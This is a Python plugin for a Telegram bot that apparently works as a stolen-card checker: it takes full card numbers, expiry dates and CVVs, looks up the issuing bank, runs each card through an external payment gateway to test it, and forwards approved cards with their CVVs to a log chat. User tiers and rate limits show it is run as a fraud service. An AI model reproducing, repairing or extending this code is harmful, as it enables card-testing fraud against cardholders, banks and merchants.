import asyncio
from bot import mdb
from ...core import client 

from ...utils import  incall_card  , get_gate_info
from ...database.redis import antidb
import time
from ..commands.decoretors import msg_send
from telethon import events
from .._helper.string import get_strings
from ...plugins.checkers.api_defs import chk_def
import requests
from veriable.veriable import LOG_CHAT
from telethon.errors.rpcerrorlist import BadRequestError


# @tgbot.on(events.NewMessage(pattern=r"\/chk"))
@msg_send(cmd="sb", text_only = True)
@incall_card()
@get_gate_info("sb")
@get_strings('card_chk')
async def _(m , cards , gate_db , user_db , lang, *args,**kwargs ):
    start_time = int(time.time())
    loop = asyncio.get_event_loop()
    cc, mes, ano, cvv , bin_info = cards
    type = bin_info['type'] or None
    bank_name = bin_info['bank_name'] or None
    country = bin_info['iso']  or None
    flag = bin_info['flag'] or None
    vendor = bin_info['vendor'] or None
    lista = f'{cc}|{mes}|{ano}|{cvv}'
    role = user_db['role']
    if role == 'Free User'  and  m.is_private:return await m.sod("Unauthorized user detected", time = 5)
    elif role == 'Free User' and not m.is_private:pass
    elif role == 'Owner':pass
    antispam_time = antidb.get(m.sender_id) or 0
    spam_time = int(time.time()) - int(antispam_time)
    if role == 'Premium User':timee = 30 
    elif role == 'Free User':timee = 60
    else:timee=0
    if spam_time < timee:
        time_left = timee - spam_time
        await m.sod(lang['antispam'].format(time_left = time_left),parse_mode= 'HTML' , time = 5)
    else:
        r = requests.Session()
        msg = await m.reply(lang['start'].format(gate_name = gate_db['gate_name'],taken = int(time.time()) - start_time,),parse_mode= 'HTML')
        berear =  await loop.run_in_executor(None, chk_def.first,r)
        antidb.set(m.sender_id, int(time.time()))
        # token = chk_def.second(r,berear,cc,mes,ano,cvv)
        token =  await loop.run_in_executor(None,chk_def.second,r , berear , cc ,mes , ano , cvv)
        msg = await msg.edit(lang['mid'].format(gate_name = gate_db['gate_name'],taken = int(time.time()) - start_time,),parse_mode= 'HTML')
        respo =  await loop.run_in_executor(None,chk_def.third,r, token )
        r_msg , r_logo , r_status= respo
        msg = await msg.edit(lang['semi_final'].format(gate_name = gate_db['gate_name'],taken = int(time.time()) - start_time,),parse_mode= 'HTML')
        try:
            await msg.edit(lang['final'].format(
            gate_name = gate_db['gate_name'],lista = lista,respo=r_msg,status=r_status,logo=r_logo,vendor = vendor,
            type = type,
            bank_name = bank_name,
            country = country,
            flag = flag,name = m.full_name(),
            id = m.sender_id,
            role = user_db['role'],
            taken = int(time.time()) - start_time,
        ), link_preview = False,parse_mode= 'HTML')
        except BadRequestError:
            return await m.client.send_message(LOG_CHAT, f"BadRequestError in Syblus Gate")
        if r_status  == "Approved":
            await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_msg} - {gate_db['gate_name']}")
    return